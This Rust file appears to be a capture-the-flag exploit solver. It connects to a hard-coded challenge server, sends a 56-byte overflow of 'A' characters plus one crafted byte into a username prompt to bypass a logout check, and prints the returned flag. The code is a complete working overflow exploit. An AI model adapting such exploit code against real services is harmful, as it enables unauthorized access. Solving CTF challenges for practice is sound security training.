use ctf_pwn::io::*;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut pipe = TcpPipe::connect("159.65.20.166:30995").await?;

    let mut payload = Payload::new();
    payload
        .recv_until(">> ")
        .push("2\n")
        .send()
        .recv_until("Username: ")
        .fill("A", 56)
        .push("\x12")
        .send()
        .recv_until("[!] For security reasons, you are logged out..\n");

    pipe.payload(&payload).await?;

    let flag = pipe.recv_until_utf8("}", false).await?;
    println!("FLAG: {flag}");    
    Ok(())
}
